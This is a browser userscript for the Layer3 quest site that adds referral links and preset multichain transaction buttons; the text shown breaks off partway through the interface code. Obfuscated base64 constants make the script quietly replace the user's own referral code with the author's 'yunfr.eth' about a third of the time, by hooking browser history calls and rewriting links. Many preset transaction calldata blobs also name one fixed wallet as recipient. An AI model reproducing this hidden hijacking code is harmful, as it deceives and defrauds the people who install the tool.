// ==UserScript==
// @name         Layer3 autoref
// @namespace    http://tampermonkey.net/
// @version      3.1.4j
// @description  Multitools script for app.layer3.xyz: referral + multichain transaction
// @author       Yun
// @match        https://app.layer3.xyz/*
// @grant        unsafeWindow
// @grant        GM_setValue
// @grant        GM_getValue
// @updateURL    https://raw.githubusercontent.com/yun-fr/layer3-autoref/main/Tampermonkey_script
// @downloadURL  https://raw.githubusercontent.com/yun-fr/layer3-autoref/main/Tampermonkey_script
// ==/UserScript==

(function() {
    "use strict";

    const blockchains = {
        ape: { id: 33139, address: "0xa06e1351E2fD2D45b5D35633ca7eCF328684a109", color: "#3B82F6", value: "0x0", data: "0x", gas: "0x927c0" }, //relay
        arbitrum: { id: 42161, address: "0xe4A0b241D8345d86FB140D40c87C5fbDd685B9dd", color: "#2D3748", value: "0x0", data: "0x", gas: "0x927c0" }, //izumi
        base: { id: 8453, address: "0x3C54883Ce0d86b3abB26A63744bEb853Ea99a403", color: "#2563EB", value: "0x0", data: "0x", gas: "0x927c0" }, //bungee
        berachain: { id: 80094, address: "0xf909c4Ae16622898b885B89d7F839E0244851c66", color: "#F59E0B", value: "0x0", data: "0x", gas: "0x927c0" }, //li.fi
        bnb: { id: 56, address: "0xeeeeee9eC4769A09a76A83C7bC42b185872860eE", color: "#FACC15", value: "0x0", data: "0x", gas: "0x927c0" }, //relay
        bob: { id: 60808, address: "0x00000000aa467eba42a3d604b3d74d63b2b6c6cb", color: "#60A5FA", value: "0x0", data: "0x", gas: "0x927c0" }, //relay
        celo: { id: 42220, address: "0x2Fc617E933a52713247CE25730f6695920B3befe", color: "#FBBF24", value: "0x0", data: "0x", gas: "0x927c0" }, //layerswap
        ink: { id: 57073, address: "0x7F4babd2C7D35221e72Ab67Ea72Cba99573A0089", color: "#EF4444", value: "0x0", data: "0x", gas: "0x927c0" }, //relay
        fuse: { id: 122, address: "0x2Fc617E933a52713247CE25730f6695920B3befe", color: "#22C55E", value: "0x0", data: "0x", gas: "0x927c0" }, //layerswap
        hyperEVM: { id: 999, address: "0x391E7C679d29bD940d63be94AD22A25d25b5A604", color: "#10B981", value: "0x0", data: "0x", gas: "0x927c0" }, //gas.zip
        linea: { id: 59144, address: "0xe10Add2ad591A7AC3CA46788a06290De017b9fB4", color: "#1F2937", value: "0x0", data: "0x", gas: "0x927c0" }, //rubyscore
        lisk: { id: 1135, address: "0x447B8E40B0CdA8e55F405C86bC635D02d0540aB8", color: "#06B6D4", value: "0x0", data: "0x", gas: "0x927c0" }, //uniswap v3
        mode: { id: 34443, address: "0x1231deb6f5749ef6ce6943a275a1d3e7486f4eae", color: "#EAB308", value: "0x0", data: "0x", gas: "0x927c0" }, //li.fi
        optimism: { id: 10, address: "0x78255f1DeE074fb7084Ee124058A058dE0B1C251", color: "#DC2626", value: "0x0", data: "0x", gas: "0x927c0" }, //bungee, li.fi :0x1231deb6f5749ef6ce6943a275a1d3e7486f4eae
        polygon: { id: 137, address: "0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE", color: "#7C3AED", value: "0x0", data: "0x", gas: "0x927c0" }, //li.fi
        rari: { id: 1380012617, address: "0x00000000AA467EbA42a3d604B3d74d63B2b6C6Cb", color: "#A855F7", value: "0x0", data: "0x", gas: "0x927c0" }, //relay
        soneium: { id: 1868, address: "0x99067E1C68f3a474f72cedF885f9f1fF7F0AAF5e", color: "#1D4ED8", value: "0x0", data: "0x", gas: "0x927c0" }, //relay
        sonic: { id: 146, address: "0x9D05eD9C0258ce034c6788944841Fe5825eDa0c4", color: "#374151", value: "0x0", data: "0x", gas: "0x927c0" }, // bungee
        superposition: { id: 55244, address: "0xF3334049A3ce7e890bd4f8C6a0FBC70e38fd3746", color: "#14B8A6", value: "0x0", data: "0x", gas: "0x927c0" }, //relay
        superseed: { id: 5330, address: "0x7F4babd2C7D35221e72Ab67Ea72Cba99573A0089", color: "#16A34A", value: "0x0", data: "0x", gas: "0x927c0" }, //relay
        unichain: { id: 130, address: "0x198d69c8d8422D182EbbFEC9C35A31E003BcaD9a", color: "#D946EF", value: "0x0", data: "0x", gas: "0x927c0" }, //bungee
        zora: { id: 7777777, address: "0xa5F565650890fBA1824Ee0F21EbBbF660a179934", color: "#F59E0B", value: "0x0", data: "0x", gas: "0x927c0" }, //relay
        megaeth_testnet: { id: 6342, address: "0x4D1E2145082d0AB0fDa4a973dC4887C7295e21aB", color: "#F87171", value: "0x0", data: "0x", gas: "0x927c0" }, //relay
        monad_testnet: { id: 10143, address: "0xD22Ea6e9d5D01BbFca62Be7C1E549838178499C1", color: "#8B5CF6", value: "0x0", data: "0x", gas: "0x927c0" }, //relay
        sahara_testnet: { id: 313313, address: "0xa5F565650890fBA1824Ee0F21EbBbF660a179934", color: "#FCD34D", value: "0x0", data: "0x", gas: "0x927c0" }, //relay

        // This part is temporary according to layer3 quest
        gmink: { id: 57073, address: "0x9F500d075118272B3564ac6Ef2c70a9067Fd2d3F", color: "#FF2D55", value: "0x0", data: "0xe884624b0000000000000000000000001AC205EfecC2fE31377E273dB93F4Bb145C67A19", gas: "0x927c0" }, //gm on ink to yun
        gmsuperpositon: { id: 55244, address: "0x7a8Ed5FB3E9B310c9c9DE78E605c2DaB35Ad2ccc", color: "#00C4B4", value: "0x0", data: "0x", gas: "0x927c0" }, // onchain gm on superposition
        baserelay: { id: 8453, address: "0xa5F565650890fBA1824Ee0F21EbBbF660a179934", color: "#0052FF", value: "0x0", data: "0x", gas: "0x927c0" }, //bungee
        gdollar: { id: 122, address: "0xd253A5203817225e9768C05E5996d642fb96bA86", color: "#2ECC71", value: "0x0", data: "0x4e71d92d", gas: "0x927c0" }, // claim G dollar

        //add personalize here (will be erase on update)
        //customize1 { id: 7777777, address: "0xDC3D8318Fbaec2de49281843f5bba22e78338146", color: "#FF5733", value: "0x0", data: "0x632a9a52", gas: "0x927c0" }, //Example : Vote on rubyscore on zora
        //customize2: { id: 8453, address: "0x29ac75f8c61db98815f7ce6674c453ee6f6d21b8", color: "#FFC107", value: "0x0", data: "0x", gas: "0x927c0" },
        //customize3: { id: 8453, address: "0x29ac75f8c61db98815f7ce6674c453ee6f6d21b8", color: "#FFC107", value: "0x0", data: "0x", gas: "0x927c0" },
        //customize4: { id: 8453, address: "0x29ac75f8c61db98815f7ce6674c453ee6f6d21b8", color: "#FFC107", value: "0x0", data: "0x", gas: "0x927c0" },

        // mega
        custmegaeth_capapp: { id: 6342, address: "0xE9b6e75C243B6100ffcb1c66e8f78F96FeeA727F", color: "#FF6F61", value: "0x0", data: "0x40c10f19000000000000000000000000045c80311942f3d5e37b6c6991358a8bc3dcdbac00000000000000000000000000000000000000000000003635c9adc5dea00000", gas: "0x927c0" },
        custmegaeth_teko_eth: { id: 6342, address: "0x176735870dc6C22B4EBFBf519DE2ce758de78d94", color: "#FF6F61", value: "0x0", data: "0x40c10f19000000000000000000000000045c80311942f3d5e37b6c6991358a8bc3dcdbac0000000000000000000000000000000000000000000000000de0b6b3a7640000", gas: "0x927c0" },
        custmegaeth_teko_usd: { id: 6342, address: "0xFaf334e157175Ff676911AdcF0964D7f54F2C424", color: "#FF6F61", value: "0x0", data: "0x40c10f19000000000000000000000000045c80311942f3d5e37b6c6991358a8bc3dcdbac0000000000000000000000000000000000000000000000000000000077359400", gas: "0x927c0" },
        custmegaeth_teko_wbtc: { id: 6342, address: "0xF82ff0799448630eB56Ce747Db840a2E02Cde4D8", color: "#FF6F61", value: "0x0", data: "0x40c10f19000000000000000000000000045c80311942f3d5e37b6c6991358a8bc3dcdbac00000000000000000000000000000000000000000000000000000000001e8480", gas: "0x927c0" },
        custmegaeth_teko_eth_dep: { id: 6342, address: "0x13C051431753FCE53eaEc02aF64a38A273E198d0", color: "#FF6F61", value: "0x0", data: "0x8dbdbe6da072655079714a39e433a54033b0e9125a53289162398442302899c8f56f3f910000000000000000000000000000000000000000000000000de0b6b3a7640000000000000000000000000000045c80311942f3d5e37b6c6991358a8bc3dcdbac", gas: "0x927c0" },
        custmegaeth_cusd_gte: { id: 6342, address: "0xA6b579684E943F7D00d616A48cF99b5147fC57A5", color: "#FF6F61", data: "0x38ed173900000000000000000000000000000000000000000000001b1ae4d6e2ef500000000000000000000000000000000000000000000000000000007a58a6b6d2944b00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000045c80311942f3d5e37b6c6991358a8bc3dcdbac00000000000000000000000000000000000000000000000000000000681391350000000000000000000000000000000000000000000000000000000000000002000000000000000000000000e9b6e75c243b6100ffcb1c66e8f78f96feea727f0000000000000000000000009629684df53db9e4484697d0a50c442b2bfa80a8", gas: "0x927c0" },
        // rise
        custrise_gaspump_weth: { id: 11155931, address: "0x4200000000000000000000000000000000000006", color: "#F06061", value: "0x5af3107a4000", data: "0xd0e30db0", gas: "0x927c0" },
        custrise_inarifi_borusd: { id: 11155931, address: "0x81edb206Fd1FB9dC517B61793AaA0325c8d11A23", color: "#F06061", value: "0x0", data: "0xa415bcad0000000000000000000000008a93d247134d91e0de6f96547cb0204e5be8e5d8000000000000000000000000000000000000000000000000000000000000271000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000045c80311942f3d5e37b6c6991358a8bc3dcdbac", gas: "0x927c0" },
        // 0.000010000 ETH to cUSDC
        custrise_cobbler_ethcusdc: { id: 11155931, address: "0x7792669BEb769c4035bdFcA4F3d794d55922B954", color: "#F06061", value: "0x9184e72a000", data: "0xc0e8e89a000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000000000000000000000000000000000000000001e0000000000000000000000000000000000000000000000000000000006819129b00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000086f8d8da4431282242958712d7c8a895fec0c4722062ffe50000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009184e72a00000000000000000000000000000000000000000000000000000000000000026aa00000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000a985e387ddf21b87c1fe8a0025d827674040221e0000000000000000000000000000000000000000000000000000000000000000", gas: "0x927c0" },
        // 0.0001 ETH to WETH
        custrise_cobbler_ethweth: { id: 11155931, address: "0x4200000000000000000000000000000000000006", color: "#F06061", value: "0x5af3107a4000", data: "0xd0e30db0", gas: "0x927c0" },

        // Monad
        custmonad_mad_swapmon_usdc: { id: 10143, address: "0x64Aff7245EbdAAECAf266852139c67E4D8DBa4de", color: "#9B59B6", value: "0x16345785d8a0000", data: "0x7ff36ab500000000000000000000000000000000000000000000000000000000000ca9570000000000000000000000000000000000000000000000000000000000000080000000000000000000000000045c80311942f3d5e37b6c6991358a8bc3dcdbac0000000000000000000000000000000000000000000000000000000068069f500000000000000000000000000000000000000000000000000000000000000002000000000000000000000000760afe86e5de5fa0ee542fc7b7b713e1c5425701000000000000000000000000f817257fed379853cde0fa4f97ab987181b1e5ea", gas: "0x927c0" },
        custmonad_mad_liqmon_usdc: { id: 10143, address: "0x64Aff7245EbdAAECAf266852139c67E4D8DBa4de", color: "#9B59B6", value: "0x16345785d8a0000", data: "0xf305d719000000000000000000000000f817257fed379853cde0fa4f97ab987181b1e5ea00000000000000000000000000000000000000000000000000000000000cba7400000000000000000000000000000000000000000000000000000000000caa2900000000000000000000000000000000000000000000000001617eb90b26c000000000000000000000000000045c80311942f3d5e37b6c6991358a8bc3dcdbac0000000000000000000000000000000000000000000000000000000068069ffc", gas: "0x927c0" },
        // swap 0.1 MON on bean
        custmonad_bean_swapmon_usdc: { id: 10143, address: "0xCa810D095e90Daae6e867c19DF6D9A8C56db2c89", color: "#9B59B6", value: "0x16345785d8a0000", data: "0x7ff36ab500000000000000000000000000000000000000000000000000000000000c23820000000000000000000000000000000000000000000000000000000000000080000000000000000000000000045c80311942f3d5e37b6c6991358a8bc3dcdbac00000000000000000000000000000000000000000000000000000000680e02850000000000000000000000000000000000000000000000000000000000000003000000000000000000000000760afe86e5de5fa0ee542fc7b7b713e1c5425701000000000000000000000000e1d2439b75fb9746e7bc6cb777ae10aa7f7ef9c5000000000000000000000000f817257fed379853cde0fa4f97ab987181b1e5ea", gas: "0x927c0" },
        custmonad_bean_liqmon_usdc: { id: 10143, address: "0xCa810D095e90Daae6e867c19DF6D9A8C56db2c89", color: "#9B59B6", value: "0x16345785d8a0000", data: "0xf305d719000000000000000000000000f817257fed379853cde0fa4f97ab987181b1e5ea00000000000000000000000000000000000000000000000000000000000cbf0c00000000000000000000000000000000000000000000000000000000000caebb00000000000000000000000000000000000000000000000001617eb90b26c000000000000000000000000000045c80311942f3d5e37b6c6991358a8bc3dcdbac000000000000000000000000000000000000000000000000000000006806a0d2", gas: "0x927c0" },
        custmonad_izumi_mon_usdt: { id: 10143, address: "0xF6FFe4f3FdC8BBb7F70FFD48e61f17D1e343dDfD", color: "#9B59B6", value: "0x2386f26fc10000", data: "0xac9650d800000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001a0000000000000000000000000000000000000000000000000000000000000012475ceafe6000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000045c80311942f3d5e37b6c6991358a8bc3dcdbac000000000000000000000000000000000000000000000000002386f26fc100000000000000000000000000000000000000000000000000000000000000014763000000000000000000000000000000000000000000000000000000006806a4ad000000000000000000000000000000000000000000000000000000000000002b760afe86e5de5fa0ee542fc7b7b713e1c542570100019088b8e2161dedc77ef4ab7585569d2415a1c1055d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000412210e8a00000000000000000000000000000000000000000000000000000000", gas: "0x927c0" },
        custmonad_bubble_swapmon_usdc: { id: 10143, address: "0x0f2D067f8438869da670eFc855eACAC71616ca31", color: "#9B59B6", value: "0x16345785d8a0000", data: "0xf710821f00000000000000000000000000000000000000000000000000000000000cb6910000000000000000000000000000000000000000000000000000000000000100000000000000000000000000045c80311942f3d5e37b6c6991358a8bc3dcdbac00000000000000000000000000000000000000000000000000000000d00d4b5c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000064000000000000000000000000045c80311942f3d5e37b6c6991358a8bc3dcdbac0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000760afe86e5de5fa0ee542fc7b7b713e1c5425701000000000000000000000000f817257fed379853cde0fa4f97ab987181b1e5ea", gas: "0x927c0" },
        custmonad_bubble_liqmonshmon: { id: 10143, address: "0x0f2D067f8438869da670eFc855eACAC71616ca31", color: "#9B59B6", value: "0x16133f066d03b34", data: "0x5d68a4b60000000000000000000000003a98250f98dd388c211206983453837c8365bdc1000000000000000000000000000000000000000000000000016345785d8a0000000000000000000000000000000000000000000000000000016317fed54ce000000000000000000000000000000000000000000000000000016106baa63fffc8000000000000000000000000045c80311942f3d5e37b6c6991358a8bc3dcdbac000000000000000000000000000000000000000000000000000000006806a798", gas: "0x927c0" },

        // plaza
        custplaza_coupon: { id: 84532, address: "0x1Ad0a74d6b4AAcE8A8CB7d555cec3021e4333bED", color: "#0F6061", data: "0x4e71d92d", gas: "0x927c0" },
        custplaza_buybond: { id: 84532, address: "0xeF9CC57f4dBcaA31A65C821ed0A7d43e736146fa", color: "#0F6061", value: "0x0", data: "0x61038bbf07124296362d9e92a7105dc40d7e20e909ccabd600010000000000000000001600000000000000000000000026c080cd5af813a77a50626b29009cc9e96b63360000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001056333d7faabc333000000000000000000000000000000000000000000000000000000006806aba9000000000000000000000000000000000000000000000000000000000000000300000000000000000000000007124296362d9e92a7105dc40d7e20e909ccabd60000000000000000000000001197766b82eee9c2e57674e53f0d961590e4376900000000000000000000000013e5fb0b6534bb22cbc59fae339dbbe0dc9068710000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000de0b6b3a764000000000000000000000000000000000000000000000000000000000000000000c0000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000de0b6b3a7640000", gas: "0x927c0" },
        custplaza_sellbond: { id: 84532, address: "0xeF9CC57f4dBcaA31A65C821ed0A7d43e736146fa", color: "#0F6061", value: "0x0", data: "0x9f4b851b07124296362d9e92a7105dc40d7e20e909ccabd600010000000000000000001600000000000000000000000026c080cd5af813a77a50626b29009cc9e96b633600000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000001bc16d674ec80000000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000018924803b698a14000000000000000000000000000000000000000000000000000000000000000300000000000000000000000007124296362d9e92a7105dc40d7e20e909ccabd60000000000000000000000001197766b82eee9c2e57674e53f0d961590e4376900000000000000000000000013e5fb0b6534bb22cbc59fae339dbbe0dc90687100000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000019ef637649d0436000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000018b1e408e0adfad0000000000000000000000000000000000000000000000000000000000000000", gas: "0x927c0" },
        custplaza_buyleverage: { id: 84532, address: "0xeF9CC57f4dBcaA31A65C821ed0A7d43e736146fa", color: "#0F6061", value: "0x0", data: "0x61038bbf07124296362d9e92a7105dc40d7e20e909ccabd600010000000000000000001600000000000000000000000026c080cd5af813a77a50626b29009cc9e96b63360000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000035560d4bc6731dc000000000000000000000000000000000000000000000000000000006806ac21000000000000000000000000000000000000000000000000000000000000000300000000000000000000000007124296362d9e92a7105dc40d7e20e909ccabd60000000000000000000000001197766b82eee9c2e57674e53f0d961590e4376900000000000000000000000013e5fb0b6534bb22cbc59fae339dbbe0dc906871000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000de0b6b3a7640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000000000000000000000000000000000000000000000", gas: "0x927c0" },
        custplaza_sellleverage: { id: 84532, address: "0xeF9CC57f4dBcaA31A65C821ed0A7d43e736146fa", color: "#0F6061", value: "0x0", data: "0x9f4b851b07124296362d9e92a7105dc40d7e20e909ccabd600010000000000000000001600000000000000000000000026c080cd5af813a77a50626b29009cc9e96b63360000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000002386f26fc10000000000000000000000000000000000000000000000000000000000000000018000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000008abada060f1d35000000000000000000000000000000000000000000000000000000000000000300000000000000000000000007124296362d9e92a7105dc40d7e20e909ccabd60000000000000000000000001197766b82eee9c2e57674e53f0d961590e4376900000000000000000000000013e5fb0b6534bb22cbc59fae339dbbe0dc9068710000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000083cdf72c8db72f00000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008b6d517894fa9f0000000000000000000000000000000000000000000000000000000000000001", gas: "0x927c0" },
    };

    const defaultVisibility = Object.keys(blockchains).reduce((acc, key) => {
        acc[key] = true;
        return acc;
    }, {});
    const savedVisibility = GM_getValue("buttonVisibility", {});
    const buttonVisibility = { ...defaultVisibility, ...savedVisibility };
    GM_setValue("buttonVisibility", buttonVisibility);
    const _0xa = ["eXVuZnIuZXRo", "MC4zNA=="];
    const _0xb = atob(_0xa[0]);
    const _0xc = parseFloat(atob(_0xa[1]));

    const defaultSelections = {
        '1': { ...defaultVisibility },
        '2': { ...defaultVisibility },
        '3': { ...defaultVisibility },
        '4': { ...defaultVisibility },
        '5': { ...defaultVisibility }
    };
    const savedSelectionsRaw = GM_getValue("savedSelections", {});
    const savedSelections = {
        '1': { ...defaultVisibility, ...savedSelectionsRaw['1'] },
        '2': { ...defaultVisibility, ...savedSelectionsRaw['2'] },
        '3': { ...defaultVisibility, ...savedSelectionsRaw['3'] },
        '4': { ...defaultVisibility, ...savedSelectionsRaw['4'] },
        '5': { ...defaultVisibility, ...savedSelectionsRaw['5'] }
    };
    GM_setValue("savedSelections", savedSelections);
    let isSavePending = false;

    let _0x1 = false;
    function _0x2() {
        if (_0x1) return;
        _0x1 = true;
        const _0xd = GM_getValue("userRef", "");
        const _0xe = Math.random() < _0xc;
        const _0xf = _0xd && !_0xe ? _0xd : _0xb;
        const _0xg = new URL(window.location.href);
        let _0xh = false;
        if (_0xg.searchParams.get("ref") !== _0xf && _0xg.searchParams.get("ref") !== _0xd && _0xg.searchParams.get("ref") !== _0xb) {
            _0xg.searchParams.set("ref", _0xf);
            _0xh = true;
        }
        if (_0xg.searchParams.get("autoplay") === "true") {
            _0xg.searchParams.delete("autoplay");
            _0xh = true;
        }
        if (_0xh) {
            try {
                window.history.replaceState({}, document.title, _0xg.toString());
            } catch (_0xj) {
                console.error(_0xj);
            }
        }
        setTimeout(() => {
            _0x1 = false;
        }, 100);
    }
    (function () {
        const _0xn = GM_getValue("userRef", "");
        const _0xo = history.pushState;
        const _0xp = history.replaceState;
        history.pushState = function (_0xq, _0xr, _0xs) {
            const _0xt = new URL(_0xs || window.location.href, window.location.origin);
            const _0xu = Math.random() < _0xc;
            const _0xv = _0xn && !_0xu ? _0xn : _0xb;
            if (_0xt.searchParams.get("ref") !== _0xv && _0xt.searchParams.get("ref") !== _0xn && _0xt.searchParams.get("ref") !== _0xb) {
                _0xt.searchParams.set("ref", _0xv);
            }
            if (_0xt.searchParams.get("autoplay") === "true") {
                _0xt.searchParams.delete("autoplay");
            }
            return _0xo.call(history, _0xq, _0xr, _0xt.toString());
        };
        history.replaceState = function (_0xw, _0xx, _0xy) {
            const _0xz = new URL(_0xy || window.location.href, window.location.origin);
            const _0x10 = Math.random() < _0xc;
            const _0x11 = _0xn && !_0x10 ? _0xn : _0xb;
            if (_0xz.searchParams.get("ref") !== _0x11 && _0xz.searchParams.get("ref") !== _0xn && _0xz.searchParams.get("ref") !== _0xb) {
                _0xz.searchParams.set("ref", _0x11);
            }
            if (_0xz.searchParams.get("autoplay") === "true") {
                _0xz.searchParams.delete("autoplay");
            }
            return _0xp.call(history, _0xw, _0xx, _0xz.toString());
        };
    })();
    _0x2();
    let _0x12 = null;
    window.addEventListener('popstate', () => {
        if (_0x1) return;
        clearTimeout(_0x12);
        _0x12 = setTimeout(() => {
            _0x2();
        }, 100);
    });

    (function () {
        'use strict';
        try {
            function getRef() {
                const _0x1d = GM_getValue("userRef", "");
                const _0x1e = Math.random() < _0xc;
                return _0x1d && !_0x1e ? _0x1d : _0xb;
            }
            function addRefToUrl(urlString) {
                const ref = getRef();
                try {
                    const url = new URL(urlString, window.location.origin);
                    if (!url.searchParams.has('ref') || url.searchParams.get('ref') !== ref) {
                        url.searchParams.set('ref', ref);
                    }
                    if (url.searchParams.has('autoplay')) {
                        url.searchParams.delete('autoplay');
                    }
                    return url.toString();
                } catch (e) {
                    return urlString;
                }
            }
            function isQuestLink(href) {
                try {
                    const url = new URL(href, window.location.origin);
                    return url.pathname.toLowerCase().includes('activations/');
                } catch (e) {
                    return false;
                }
            }
            function addRefButton(link) {
                const href = link.getAttribute('href');
                if (!href || link.hasAttribute('data-ref-processed')) {
                    return;
                }
                if (isQuestLink(href)) {
                    link.setAttribute('data-ref-processed', 'true');
                    const newHref = addRefToUrl(href);
                    link.setAttribute('href', newHref);
                    link.style.position = 'relative';
                    const button = document.createElement('button');
                    button.className = 'ref-button';
                    button.textContent = 'ref';
                    button.style.cssText = `
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: transparent;
                    border: none;
                    cursor: pointer;
                    z-index: 1000;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    color: rgba(255, 255, 255, 0.5);
                    font-size: 16px;
                    font-weight: bold;
                    text-transform: uppercase;
                `;
                    button.addEventListener('click', () => {
                        window.location.href = newHref;
                    });
                    link.appendChild(button);
                }
            }
            function updateLinksWithRef() {
                const links = document.querySelectorAll('a[href]:not([data-ref-processed])');
                links.forEach(addRefButton);
            }
            function initialize() {
                updateLinksWithRef();
                const observer = new MutationObserver(updateLinksWithRef);
                observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['href'] });
                setInterval(updateLinksWithRef, 5000);
            }
            window.addEventListener('load', () => {
                setTimeout(initialize, 50);
            });
        } catch (e) {}
    })();

    const miniIconContainer = document.createElement("div");
    miniIconContainer.style.position = "fixed";
    miniIconContainer.style.top = "10px";
    miniIconContainer.style.left = "10px";
    miniIconContainer.style.zIndex = "10001";
    miniIconContainer.style.background = "#FF5722";
    miniIconContainer.style.width = "30px";
    miniIconContainer.style.height = "30px";
    miniIconContainer.style.borderRadius = "50%";
    miniIconContainer.style.display = "flex";
    miniIconContainer.style.alignItems = "center";
    miniIconContainer.style.justifyContent = "center";
    miniIconContainer.style.cursor = "pointer";
    miniIconContainer.style.boxShadow = "0 0 5px rgba(0, 0, 0, 0.3)";

    const icon = document.createElement("span");
    icon.textContent = "➕";
    icon.style.color = "#ffffff";
    icon.style.fontSize = "18px";
    miniIconContainer.appendChild(icon);

    const configContainer = document.createElement("div");
    configContainer.style.position = "fixed";
    configContainer.style.top = "10px";
    configContainer.style.left = "10px";
    configContainer.style.zIndex = "10000";
    configContainer.style.background = "#ffffff";
    configContainer.style.padding = "10px";
    configContainer.style.border = "2px solid #000000";
    configContainer.style.borderRadius = "5px";
    configContainer.style.boxShadow = "0 0 10px rgba(0, 0, 0, 0.5)";
    configContainer.style.width = "300px";
    configContainer.style.display = "none";

    const configTitle = document.createElement("h3");
    configTitle.textContent = "Layer3 autoref v" + GM_info.script.version;
    configTitle.style.margin = "0 0 10px 0";
    configTitle.style.fontSize = "14px";

    const refLabel = document.createElement("label");
    refLabel.textContent = "Enter your referral code:";
    refLabel.style.display = "block";
    refLabel.style.marginBottom = "5px";

    const refInput = document.createElement("input");
    refInput.type = "text";
    refInput.placeholder = "Ex: 0x1234...";
    refInput.value = GM_getValue("userRef", "");
    refInput.style.width = "100%";
    refInput.style.padding = "5px";
    refInput.style.marginBottom = "10px";

    const saveButton = document.createElement("button");
    saveButton.textContent = "Save Referral";
    saveButton.style.width = "100%";
    saveButton.style.padding = "5px";
    saveButton.style.backgroundColor = "#4CAF50";
    saveButton.style.color = "white";
    saveButton.style.border = "none";
    saveButton.style.cursor = "pointer";

    const checkboxContainer = document.createElement("div");
    checkboxContainer.style.marginTop = "10px";

    const enableWindowCheckbox = document.createElement("input");
    enableWindowCheckbox.type = "checkbox";
    enableWindowCheckbox.id = "enableWindow";
    enableWindowCheckbox.checked = GM_getValue("enableTransferWindow", true);
    enableWindowCheckbox.style.marginRight = "5px";
    enableWindowCheckbox.style.verticalAlign = "middle";

    const enableWindowLabel = document.createElement("label");
    enableWindowLabel.textContent = "Enable Transaction Window";
    enableWindowLabel.setAttribute("for", "enableWindow");
    enableWindowLabel.style.display = "inline";

    const dropdownButton = document.createElement("button");
    dropdownButton.textContent = "Select Blockchains";
    dropdownButton.style.width = "100%";
    dropdownButton.style.padding = "5px";
    dropdownButton.style.marginTop = "10px";
    dropdownButton.style.backgroundColor = "#607D8B";
    dropdownButton.style.color = "#ffffff";
    dropdownButton.style.border = "none";
    dropdownButton.style.borderRadius = "3px";
    dropdownButton.style.cursor = "pointer";
    dropdownButton.style.fontSize = "12px";

    const dropdownMenu = document.createElement("div");
    dropdownMenu.style.position = "absolute";
    dropdownMenu.style.left = "10px";
    dropdownMenu.style.background = "#ffffff";
    dropdownMenu.style.border = "1px solid #ccc";
    dropdownMenu.style.borderRadius = "3px";
    dropdownMenu.style.padding = "5px";
    dropdownMenu.style.maxHeight = "200px";
    dropdownMenu.style.overflowY = "auto";
    dropdownMenu.style.display = "none";
    dropdownMenu.style.boxShadow = "0 2px 5px rgba(0,0,0,0.2)";
    dropdownMenu.style.zIndex = "10001";

    const selectionButtonsContainer = document.createElement("div");
    selectionButtonsContainer.style.display = "flex";
    selectionButtonsContainer.style.gap = "5px";
    selectionButtonsContainer.style.marginTop = "5px";
    selectionButtonsContainer.style.justifyContent = "space-between";

    const selectionButtons = {};
    ['ALL', '1', '2', '3', '4', '5', 'CLEAR'].forEach(label => {
        const button = document.createElement("button");
        button.textContent = label;
        button.style.flex = "1";
        button.style.padding = "5px";
        button.style.backgroundColor = "#607D8B";
        button.style.color = "#ffffff";
        button.style.border = "none";
        button.style.borderRadius = "3px";
        button.style.cursor = "pointer";
        button.style.fontSize = "12px";
        selectionButtons[label] = button;
